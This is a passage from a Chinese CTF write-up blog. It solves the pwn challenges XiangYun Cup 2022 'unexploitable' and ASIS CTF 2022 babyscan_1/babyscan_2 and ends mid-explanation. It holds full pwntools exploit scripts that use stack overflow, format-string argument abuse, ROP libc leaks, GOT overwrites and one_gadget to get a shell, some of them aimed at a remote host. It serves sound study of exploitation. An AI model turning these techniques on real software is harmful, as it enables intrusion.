栈迁移+sigreturn\n\n参考wp：https://github.com/zj3t/pwnable.tw\n\n\n\n### 其他暴破思路\n\n1. 改read_got为onegadget\n\n   read函数在libc中的偏移：0xf6670\n\n   `0xf0567`这条gadget的偏移：0xf0567\n\n   只需要暴破半个字节\n\n2. 改sleep_got为execve\n\n   > 本地打成功了，远程未成功\n\n   sleep函数在libc中的偏移：0xCB680\n\n   execve函数在libc中的偏移：0xCBBC0\n\n   分三步：\n\n   - 先把\"/bin/sh\"写到bss段，0x60130\n   - 再布置好rdi,rsi,rdx，（利用csu gadget）\n   - 回到调用sleep处\n\n\n\n# 祥云杯2022 unexploitable\n\n附件：[unexploitable.tar](unexploitable.tar)\n\n## 分析\n\n二进制基本信息\n\n```bash\n$ file ./unexploitable \n./unexploitable: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d66afeabecb7b7190cfbdbc4bb6b5846c896e2a, stripped\n$ checksec ./unexploitable\n[*] '/home/bling/Downloads/unexploitable'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n\n```\n\nIDA打开看main函数逻辑，很明显有个栈溢出\n\n```c\n__int64 __fastcall main(int a1, char **a2, char **a3)\n{\n  sub_7D0();\n  return 0LL;\n}\n\nssize_t sub_7D0()\n{\n  char buf[16]; // [rsp+0h] [rbp-10h] BYREF\n\n  return read(0, buf, 0x30000uLL);\t\t/*栈溢出*/\n}\n```\n\n执行二进制，确认输入超长字符串会使程序崩溃\n\n```bash\n$ ./unexploitable \naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nSegmentation fault (core dumped)\n```\n\n## 调试\n\n这个题直接用`gdb ./unexploitable`调试的话，执行完`read(0, buf, 0x30000uLL)`将返回`-1`，不知道是有反调试还是咋。最终用pwntools的gdb.attach()实现的调试，脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyio = process(\"./unexploitable\")\ngdb.attach(myio)\nsleep(3)\npayload = cyclic(50)\nmyio.send(payload)\nmyio.interactive()\n```\n\n得到偏移24后的8byte数据会覆盖`sub_7D0()`函数返回时的`RIP`\n\n```\n>>> from pwn import *\n>>> cyclic_find(\"gaaa\")\n24\n```\n\n通过如下脚本，可以实现劫持控制流到任意地址`ret_addr`。\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyio = process(\"./unexploitable\")\ngdb.attach(myio)\nsleep(3)\nret_addr = 0xdeadbeef\npayload = b\"a\"*24 + p64(ret_addr)\nmyio.send(payload)\nmyio.interactive()\n```\n\n## 利用\n\n于是这个题，最让人困扰的地方到了。开了PIE，GOT表只读，没有`puts/write/printf`等可以泄露地址的函数。所以这个`ret_addr`改成什么呢？\n\n此时无法通过泄露获得完整的地址，而栈上返回地址是返回到main中的。如果利用一下这个地址，`ret_addr`只覆盖低1字节，或者低2字节，是可以实现跳转到text段某个地址处执行的。但是琢磨了一圈也没想到合适的代码片段。\n\n查看`sub_7D0()`函数返回时的状态，如下图。如果通过栈溢出将`+0x0000`和`+0x0008`跳过，覆盖`+0x0010`低字节为某个onegadget的值，并将其pop到rip中，就能实现get shell。\n\n![image-20221030021539691](image-20221030021539691.png?size=600)\n\n怎么pop呢？`0xffffffffff600000[vsyscall]`区域，可以当作一个单独的`ret` gadget，能满足上述要求。\n\n题目给的libc中有如下三个one_gadget，根据调试时内存状态，选择了`0x4f302`这个。\n\n```bash\n0x4f2a5 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  rsp & 0xf == 0\n  rcx == NULL\n\n0x4f302 execve(\"/bin/sh\", rsp+0x40, environ)\nconstraints:\n  [rsp+0x40] == NULL\n\n0x10a2fc execve(\"/bin/sh\", rsp+0x70, environ)\nconstraints:\n  [rsp+0x70] == NULL\n```\n\n因此，我们只需将栈中覆盖成如下状态，就能达到执行libc中one_gadget的目的。其中`302`是固定的，`x4f`可以随机选择，我们需要暴破这1.5个字节，概率为`1/(2^12) = 1/4096`。\n\n![image-20221030022435819](image-20221030022435819.png?size=600)\n\n最终我选择的暴破目标是\"84f302\"，代码如下，在本地有一定的概率get shell。\n\n```python\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"error\")\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        myio = process(\"./unexploitable\")\n        vsyscall_addr = 0xffffffffff600000\n        payload_str = b\"a\"*24 + p64(vsyscall_addr)+ p64(vsyscall_addr) + b\"\\x02\\xf3\\x84\"\n        myio.send(payload_str)\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n\n```\n\n但是，打远程的时候有些奇怪现象出现，需要连续输入4次才有反应，打远程的exp如下\n\n```python\nfrom pwn import *\n# context(arch=\"amd64\",os=\"linux\",log_level=\"error\")\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nwhile True:\n    try:\n        # mymyio = process(\"./unexploitable\")\n        myio = remote(\"ip\",port)\n        vsyscall_addr = 0xffffffffff600000\n        payload = b\"a\"*24 + p64(vsyscall_addr)+ p64(vsyscall_addr) + b\"\\x02\\xf3\\x84\"\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.send(payload)\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.sendline(\"cat flag\")\n        sleep(0.03)\n        myio.recv()\n        myio.interactive()\n        break\n    except EOFError:\n        myio.close()\n```\n\n## 知识点 - vsyscall\n\n使用vmmap可以看到vsyscall区域，它的起始地址是固定的0xffffffffff600000，可以将该地址抽象为一个`ret`（详细情况见文章：[vsyscall bypass pie](https://www.cnblogs.com/luoleqi/p/13579478.html)）。\n\n```bash\ngef➤  vmmap\n[ Legend:  Code | Heap | Stack ]\nStart              End                Offset             Perm Path\n......\n0x007fffda5e5000 0x007fffda5e6000 0x00000000000000 r-x [vdso]\n0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]\t\t# 这里\n```\n\n在ubuntu16.04中，该区域可读。我们可以在gdb中查看到该区域的内容：\n\n```bash\ngef➤  vmmap\n......\n0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]\n0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]\ngef➤  x/5i 0xffffffffff600000\n   0xffffffffff600000:\tmov    rax,0x60\t\t\t# sys_gettimeofday\n   0xffffffffff600007:\tsyscall \t\t\t\t# 注意，劫持控制流直接到syscall这里是不可行的\n   0xffffffffff600009:\tret    \n   0xffffffffff60000a:\tint3   \n   0xffffffffff60000b:\tint3     \ngef➤  x/5i 0xffffffffff600400\n   0xffffffffff600400:\tmov    rax,0xc9\t\t\t# sys_time\n   0xffffffffff600407:\tsyscall \n   0xffffffffff600409:\tret    \n   0xffffffffff60040a:\tint3   \n   0xffffffffff60040b:\tint3     \ngef➤  x/5i 0xffffffffff600800\n   0xffffffffff600800:\tmov    rax,0x135\t\t# sys_getcpu\n   0xffffffffff600807:\tsyscall \n   0xffffffffff600809:\tret    \n   0xffffffffff60080a:\tint3   \n   0xffffffffff60080b:\tint3      \n```\n\n\n\n\n\n","categories":["CTF"]},{"title":"ASIS CTF 2022 pwn babyscan_1 babyscan_2","url":"/2022/10/17/asis-ctf-2022-pwn/","content":"\n\n\n# babyscan_1\n\n题目附件：[babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz](babyscan_1_12c5d902584e857a4f680aa1575d2fd81e08ec03.txz)\n\n## 题目分析\n\n两道题都给了源码，第一题main函数源码如下\n\n```c\nint main() {\n  char size[16], fmt[8], *buf;\n\n  printf(\"size: \");\n  scanf(\"%15s\", size);\t\t\t// 输入需要alloca内存的大小，可输入的长度是15个字符\n  if (!isdigit(*size)) {\t\t// 仅判断输入的第一个字符，要求为数字\n    puts(\"[-] Invalid number\");\n    return 1;\n  }\n\n  buf = (char*)alloca(atoi(size) + 1);\t\t// alloca表示在栈上申请一段空间，atoi仅识别连续数字部分\n\n  printf(\"data: \");\n  snprintf(fmt, sizeof(fmt), \"%%%ss\", size);\t// 将输入的size转为\"%[size]s\"，由于fmt仅占8字节，size字符串过长会冲掉后面的\"s\"\n  scanf(fmt, buf);\t\t\t// fmt作为格式话字符，等待用户输入，并将输入转化到buf中\n\n  return 0;\n}\n```\n\n二进制的基本信息如下：\n\n```bash\n$ file chall      \nchall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b31cf6b807484f2d04a80ceb67725cdb0f0785cd, for GNU/Linux 3.2.0, not stripped\n\n$ checksec chall      \n[*] '/home/bling/Downloads/1014-asis/baby_scan_1/bin/chall'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\t\t\t\t# 部分RELRO说明GOT表可写\n    Stack:    No canary found\t\t\t# 无canary，如果是栈溢出漏洞，利用将简单很多\n    NX:       NX enabled\t\t\t\t# 栈和bss段不可执行\n    PIE:      No PIE (0x400000)\t\t\t# 未开PIE，代码段无随机化，有助于利用\n```\n\n根据源码及二进制信息可以推测，这题是让我们用格式化字符串整一个栈溢出。\n\nsize如果输入为22，alloca申请23的空间（`buf[23]`），最后一个scanf就为`scanf(\"%22s\",buf)`，不会产生溢出。\n\n所以，应该怎样来构造输入呢？\n\n还记得[格式化字符串格式](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_4)中的`n$` 吗？假如我们输入size为`22$`，alloca会申请`buf[23]`，到最后那个scanf的时候就成了`scanf(\"%22$s\"，buf)`。发现了什么？我们可以往scanf的第23个参数指向的地址处，写无限长度的字符串( •̀ ω •́ )y\n\n把上面的22改成1，就能往buf中越界写啦，调试得到此时的返回地址偏移为72。代码如下\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\npayload = cyclic(200)\n\ngdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\n到此已经可以劫持控制流了。程序中没有后门函数，那么需要找libc中one_gadget，或者通过ROPgadget布置好栈空间获得shell。这两种方法的前提都是要想办法泄露libc基址。\n\n## 泄露libc基址\n\n根据got表中的的函数，及调试信息，考虑通过`puts(snprintf_got)`打印libc地址。\n\n```\n.got.plt:0000000000404018 off_404018      dq offset puts          ; DATA XREF: _puts+4↑r\n.got.plt:0000000000404020 off_404020      dq offset setbuf        ; DATA XREF: _setbuf+4↑r\n.got.plt:0000000000404028 off_404028      dq offset printf        ; DATA XREF: _printf+4↑r\n.got.plt:0000000000404030 off_404030      dq offset snprintf      ; DATA XREF: _snprintf+4↑r\n.got.plt:0000000000404038 off_404038      dq offset alarm         ; DATA XREF: _alarm+4↑r\n.got.plt:0000000000404040 off_404040      dq offset atoi          ; DATA XREF: _atoi+4↑r\n.got.plt:0000000000404048 off_404048      dq offset __isoc99_scanf\n.got.plt:0000000000404048                                         ; DATA XREF: ___isoc99_scanf+4↑r\n.got.plt:0000000000404050 off_404050      dq offset __ctype_b_loc ; DATA XREF: ___ctype_b_loc+4↑r\n```\n\n为此，只需通过ROPgadget找到一条控制rdi（64位下存放函数调用的第一个参数）的代码片段，即0x401433。\n\n```bash\n$ ROPgadget --binary ./bin/chall | grep rdi\n0x00000000004012d6 : mov word ptr [rax + rdi*8], fs ; sldt word ptr [rax] ; add bl, ch ; jmp 0xffffffff82029c2b\n0x0000000000401186 : or dword ptr [rdi + 0x404068], edi ; jmp rax\n0x0000000000401433 : pop rdi ; ret\n0x00000000004011f8 : stosd dword ptr [rdi], eax ; add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret\n```\n\n最后，在栈上依次布置好`pop rdi;ret`地址，`snprintf`got表项地址，puts的plt表项地址，最后是main函数地址（这样我们可以再次实现控制流劫持，获得shell）。\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_puts = 0x4010B4\nmain_addr = 0x401216\npayload = b'a'*72+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)\n\n# gdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recvline()[:6].ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\nmyio.interactive()\n```\n\n以上代码获取到libc基址并打印后，将返回main函数继续执行。\n\n## get shell\n\n使用one_gadget找到如下3段代码\n\n```bash\n$ one_gadget ./lib/libc.so.6 \n0xe3afe execve(\"/bin/sh\", r15, r12)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [r12] == NULL || r12 == NULL\n\n0xe3b01 execve(\"/bin/sh\", r15, rdx)\nconstraints:\n  [r15] == NULL || r15 == NULL\n  [rdx] == NULL || rdx == NULL\n\n0xe3b04 execve(\"/bin/sh\", rsi, rdx)\nconstraints:\n  [rsi] == NULL || rsi == NULL\n  [rdx] == NULL || rdx == NULL\n```\n\n通过调试发现`ret`时的寄存器情况只满足`0xe3b01`这段代码，选中它，最终get shell的完整脚本如下：\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n# myio = remote(\"65.21.255.31\",13370)\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_puts = 0x4010B4\nmain_addr = 0x401216\npayload = b'a'*72+p64(pop_rdi)+p64(got_snprintf)+p64(plt_puts)+ p64(main_addr)\n\n# gdb.attach(myio,\"b *0x401364 \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recvline()[:6].ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\n# one_gadget offset: 0xe3b01\nexec_bin_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload = b'a'*72+p64(exec_bin_sh)\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\n## 思考\n\nleak libc的时候，上面使用的是`puts(got_snprintf)`，按理说用printf函数也能达到泄露的效果，但是一旦将puts改成printf，就会segmentation fault。\n\n查了些资料，这种错误有两种可能：\n\n1. malloc中控制流劫持后嵌套调用printf，因为printf也会调用malloc，这种嵌套调用容易出问题\n2. `call printf`时，栈的状态不是16字节对齐\n\n[The x86-64 System V ABI guarantees 16-byte stack alignment before a `call`](https://stackoverflow.com/a/54399217)\n\n（类似地，某些题目劫持控制流执行`system(\"/bin/sh\")`在ubuntu16.04中能成功，但在ubuntu18.04中就失败，也同样是因为对齐地问题。）\n\n如果用printf泄露libc，那么本题地wp如下\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n# myio = remote(\"65.21.255.31\",13370)\n\npop_rdi = 0x401433\ngot_snprintf = 0x404030\nplt_printf = 0x4010D0\nstart_addr = 0x401130\t\t\t\t# 如果回main的话，下一次调用printf时栈不对齐。回start可避免该问题\npayload = b'a'*72+p64(0x401430)+ p64(0) + p64(0) + p64(pop_rdi)+p64(got_snprintf)+p64(plt_printf)+ p64(start_addr)\t\t# 增加了0x401430这个gadget，调整call printf时栈对齐\n\ngdb.attach(myio,\"b *0x40136e \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\nmyio.sendlineafter(\"data: \",payload)\nsnprintf_addr = u64(myio.recv(6).ljust(8,b\"\\x00\"))\nlibc_base = snprintf_addr - 0x61d60\nprint(hex(libc_base))\n\n# one_gadget offset: 0xe3b01\nexec_bin_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload = b'a'*72+p64(exec_bin_sh)\nmyio.sendlineafter(\"data: \",payload)\n\nmyio.interactive()\n```\n\n\n\n## 另一种方法：使用ret2csu_init\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ncsu_first_addr = 0x40142A\ncsu_second_addr = 0x401410\n\ndef csu(rbx, rbp, r12, r13, r14, r15, next_func):\n    # pop rbx,rbp,r12,r13,r14,r15\n    # rbx should be 0,\n    # rbp should be 1,enable not to jump\n    # r15 should be the function we want to call\n    # rdi=edi=r12d\n    # rsi=r13\n    # rdx=14\n    payload = b'a'*72 + p64(0x401430) + p64(0x0) +p64(0x0)\t\t# 作为通用csu函数时，后三个p64应当删除，这里是为了使call printf时（泄露libc）栈对齐\n    payload += p64(csu_first_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)\n    payload += p64(csu_second_addr)\n    payload += b'b' * 0x38\n    payload += p64(next_func)\n    return payload\n\n# gdb.attach(myio,\"b *0x40136E \\n c\")\nmyio.sendlineafter(\"size: \",b\"1$\")\n# printf(snprintf_got) \n# csu(0,1,arg1,arg2,arg3,got_printf,ret2start)\npayload1 = csu(0,1,0x404030,0,0,0x404028,0x401130)\nmyio.sendlineafter(\"data: \",payload1)\n\nlibc_snprintf = u64(myio.recv(6).ljust(8,b\"\\x00\"))\nlibc_base = libc_snprintf - 0x61d60\nprint(hex(libc_base))\n\nexec_sh = libc_base + 0xe3b01\nmyio.sendlineafter(\"size: \",b\"1$\")\npayload2 = b'a'*72 + p64(0x401432) + p64(0) + p64(exec_sh)\t\t# 为了满足one_gadget的条件，增加了一条0x401432，使r15寄存器为0\nmyio.sendlineafter(\"data: \",payload2)\n\nmyio.interactive()\n```\n\n# babyscan_2\n\n题目附件：[babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz](babyscan_2_c5b1d8e83c4dadd3d3d96f8f9b7ea7a717f48ea0.txz)\n\n## 题目分析\n\n第二个题跟第一个题的差别在于，将alloca改成了malloc。这时申请的内存在堆上，不再能够轻易栈溢出了，而题目中也没有free函数，无法利用堆上的数据结构劫持控制流。\n\n```\n  buf = (char*)malloc(atoi(size) + 1);\n```\n\n根据第一题的状态，`scanf(\"%1$s\", buf)`的buf在堆上，往它写再多数据也没用。那么能不能往“**隐藏的参数** ”里写呢？\n\n输入size为`1$saaaabbbbcccc`，查看第二个scanf的状态。RDI-格式化字符串；RSI-堆地址；RDX-堆地址；RCX-0；R8-无效地址；R9-栈空间低地址（当前栈帧未使用）。然后就是栈中的参数依次是：0x7f1488c892e8，0x61616161243125，“9$saaabb”，**“bbccccc”（我们可控，对应`9$`）**。\n\n```bash\n## 寄存器情况\n RAX  0x0\n RBX  0x401390 ◂— endbr64 \n RCX  0x0\n RDX  0x5555567472a0 ◂— 0x0\n RDI  0x7ffca62e5c38 ◂— 0x61616173243925 /* '%9$saaa' */\n RSI  0x5555567472a0 ◂— 0x0\n R8   0xffffffff\n R9   0x7ffca62e5ac0 ◂— 0x2\n R10  0x40202e ◂— 0x4c3b031b010073 /* 's' */\n R11  0x7ffca62e5c40 ◂— '9$saaabbbbcccc'\n R12  0x401170 ◂— endbr64 \n R13  0x7ffca62e5d48 ◂— 0x1c\n R14  0x0\n R15  0x0\n RBP  0x7ffca62e5c60 ◂— 0x0\n RSP  0x7ffca62e5c30 —▸ 0x7f1488c892e8 (__exit_funcs_lock) ◂— 0x0\n RIP  0x40132b ◂— call   0x401140\n\n## 栈中情况\n00:0000│ rsp 0x7ffca62e5c30 —▸ 0x7f1488c892e8 (__exit_funcs_lock) ◂— 0x0\n01:0008│ rdi 0x7ffca62e5c38 ◂— 0x61616173243925 /* '%9$saaa' */\n02:0010│ r11 0x7ffca62e5c40 ◂— '9$saaabbbbcccc'\n03:0018│     0x7ffca62e5c48 ◂— 0x636363636262 /* 'bbcccc' */\n04:0020│     0x7ffca62e5c50 —▸ 0x7ffca62e5d48 ◂— 0x1c\n05:0028│     0x7ffca62e5c58 —▸ 0x5555567472a0 ◂— 0x0\n06:0030│ rbp 0x7ffca62e5c60 ◂— 0x0\n07:0038│     0x7ffca62e5c68 —▸ 0x7f1488abc083 (__libc_start_main+243) ◂— mov    edi, eax\n```\n\n因此，通过控制输入size为`9$saaabb+p64(0xbabebabe)`，使`scanf(\"%9$saaa\",buf)`时将输入的内容写入地址0xbabebabe处。\n\n至此，我们获得了任意地址写任意值（且%s无长度限制）的能力。通过如下代码片段确认任意地址写的能力\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); 只接收最多15个字符，不要输超过，不然会影响下一个scanf的输入！！！\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\ngdb.attach(myio,\"b *0x40132b \\n c\")  \t\t# 通过调试，看到0x404070地址处被成功写为0xddccbbaa\n\npayload1 = b\"\\xaa\\xbb\\xcc\\xdd\"\t\t\naaw(0x404070,payload1)\nmyio.interactive()\n```\n\n有了一次任意地址写的能力，但对于利用来说还不够，因此首先需要想办法将一次变成多次。另外got表可写，考虑将某个函数的got表项改成one_gadget地址，就可以get shell，在这之前需要先泄露libc基址。\n\n## 让main进入循环\n\n由于任意地址写完之后就会调用`exit(0)`推出程序，无法进一步泄露或利用信息。因此首先利用任意地址写，将exit的got表项改成main函数或start函数。这样就具备了无数次任意地址写的能力。\n\n```python\nfrom pwn import *\ncontext(arch=\"amd64\",os=\"linux\",log_level=\"debug\")\n\nmyelf = ELF(\"./bin/chall\")\nmylibc = ELF(\"./lib/libc.so.6\")\nmyld = ELF(\"./lib/ld-2.31.so\")\nmyio = process(argv=[myld.path,myelf.path],env={\"LD_PRELOAD\" : mylibc.path})\n\ndef aaw(addr,value):\n    p_size  = b\"9$saaabb\"+ p64(addr)[:-1]       # scanf(\"%15s\", size); only handle 15 char\n    myio.sendlineafter(\"size: \",p_size)\n    myio.sendlineafter(\"data: \",value)\n\ngdb.attach(myio,\"b *0x40132b \\n c\")  \n\npayload1 = p64(0x401256)[:-1]    # return main ,需要注意，任意地址写的时候，要密切关注被写位置是否超范围覆盖。比如这里如果不在最后加[:-1]的话就会将后一个got表项（__ctype_b_loc）写坏。导致再次进main函数后，执行出错\n# payload2 = p64(0x401170)[:-1]    # return start \naaw(0x404058,payload1)      # exit_got: 0x404058\nmyio.interactive()\n```\n\n## 泄露libc地址\n\n怎么泄露libc呢？\n\n在main函数中搜寻了所有的函数，以及所有可能的方式，无果。因为只要改了main中使用到的任何一个函数，下次再回到main函数，就无法再获得任意地址写的能力了，也就无法继续利用了。\n\n所以回到got表，看看有没有其他能用的函数。如下，setbuf和alarm函数不是在main函数中使用，而是init_array中的setup函数调用过的。alarm函数的参数写死了，无法调整。于是只剩下了setbuf这个函数(●ˇ∀ˇ●)嘿嘿，如果将setup的got表项改成puts的plt地址，也许能输出点什么。\n\n```\n.got.plt:0000000000404018 B8 40 40 00 00 00 00 00 off_404018      dq offset puts          ; DATA XREF: _puts+4↑r\n.got.plt:0000000000404020 C0 40 40 00 00 00 00 00 off_404020      dq offset setbuf        ; DATA XREF: _setbuf+4↑r\n.got.plt:0000000000404028 C8 40 40 00 00 00 00 00 off_404028      dq offset printf        ; DATA XREF: _printf+4↑r\n.got.plt:0000000000404030 D0 40 40 00 00 00 00 00 off_404030      dq offset snprintf      ; DATA XREF: _snprintf+4↑r\n.got.plt:0000000000404038 D8 40 40 00 00 00 00 00 off_404038      dq offset alarm         ; DATA XREF: _alarm+4↑r\n.got.plt:0000000000404040 E8 40 40 00 00 00 00 00 off_404040      dq offset malloc        ; DATA XREF: _malloc+4↑r\n.got.plt:0000000000404048 F0 40 40 00 00 00 00 00 off_404048      dq offset atoi          ; DATA XREF: _atoi+4↑r\n.got.plt:0000000000404050 F8 40 40 00 00 00 00 00 off_404050      dq offset __isoc99_scanf\n.got.plt:0000000000404050                                                                 ; DATA XREF: ___isoc99_scanf+4↑r\n.got.plt:0000000000404058 00 41 40 00 00 00 00 00 off_404058      dq offset exit          ; DATA XREF: _exit+4↑r\n.got.plt:0000000000404060 08 41 40 00 00 00 00 00 off_404060      dq offset __ctype_b_loc ; DATA XREF: ___ctype_b_loc+4↑r\n```\n\n来看看setup函数中的三个setbuf，分别用来初始化stdin，stdout和stderr。~~stdin和stdout如果动了的话，可能会影响跟程序的交互，于是理所当然选择stderr。~~ 貌似用哪个都无所谓，因为第一次进main函数已经初始化过了，而且setbuf的got表项被改了，这三条相当于都废了。（不过不确定stdin/stdout在其他地方有没有引用，所以还是不改它们为好）\n\n```c\nvoid setup()\n{\n  setbuf(stdin, 0LL);\n  setbuf(stdout, 0LL);\n  setbuf(stderr, 0LL);\t\t// 0x401379 \tcall    _setbuf\n}\n```\n\n断点下到0x401379，观察此时的参数及相关内存空间状态。RDI值如下，是stderr（0x4040a0）处存放的值（libc地址）。如果将setbuf的got表项值替换成puts的plt表项地址（0x4010D0），那么这里应该是`puts(0x7ff2ff9435c0)`，即输出0xfbad2087，并非我们想要的libc地址。\n\n```bash\nRDI  0x7ff2ff9435c0 (_IO_2_1_stderr_) ◂— 0xfbad2087\n\n# stderr: 0x4040a0 <-- 0x7ff2ff9435c0 (_IO_2_1_stderr_) <-- 0xfbad2087\n```\n\n怎么办呢，看来得把stderr处存放的值改掉。有两种改法：\n\n- 0x7ff2ff9435c0地址附近有libc地址。所以可以将最低1个字节改成“\\x00”，可以leak出0x00007ff2ff940440这个值（此时libc基址0x7ff2ff756000），之后通过偏移（0x1ea440）便能计算出基址。\n\n  ```bash\n  pwndbg> x/10gx 0x7ff2ff9435c0-0x20\n  0x7ff2ff9435a0 <_IO_list_all>:\t0x00007ff2ff9435c0\t0x0000000000000000\n  0x7ff2ff9435b0:\t0x0000000000000000\t0x0000000000000000\n  0x7ff2ff9435c0 <_IO_2_1_stderr_>:\t0x00000000fbad2087\t0x00007ff2ff943643\n  0x7ff2ff9435d0 <_IO_2_1_stderr_+16>:\t0x00007ff2ff943643\t0x00007ff2ff943643\n  0x7ff2ff9435e0 <_IO_2_1_stderr_+32>:\t0x00007ff2ff943643\t0x00007ff2ff943643\n  pwndbg> x/50gx 0x7ff2ff943500\n  0x7ff2ff943500 <_nl_global_locale+96>:\t0x00007ff2ff940440\t0x00007ff2ff8f23c0\n  0x7ff2ff943510 <_nl_global_locale+112>:\t0x00007ff2ff8f14c0\t0x00007ff2ff8f1ac0\n  # 此时的地址空间布局\n  pwndbg> vmmap\n  ......\n      0x7ff2ff756000     0x7ff2ff778000 r--p    22000 0      /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff778000     0x7ff2ff8f0000 r-xp   178000 22000  /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff8f0000     0x7ff2ff93e000 r--p    4e000 19a000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff93e000     0x7ff2ff942000 r--p     4000 1e7000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n      0x7ff2ff942000     0x7ff2ff944000 rw-p     2000 1eb000 /home/bling/Downloads/1014-asis/baby_scan_2/lib/libc.so.6\n  ......\n  ```\n\n- got表项中存了libc地址。把stderr处的值改成got表项的地址\n\n这里使用后一种方法，泄露snprintf的libc地址，进而得到libc基址，三步：\n\n1. 改写stderr（0x4040a0）地址处的值为snprintf的got表项地址（0x404030）\n2. 改写setbuf的got表项（0x404020）。由于\"\\x20\"是空格，在scanf的时候会被过滤，所以我们偏移一个字节写0x40401f处\n3. 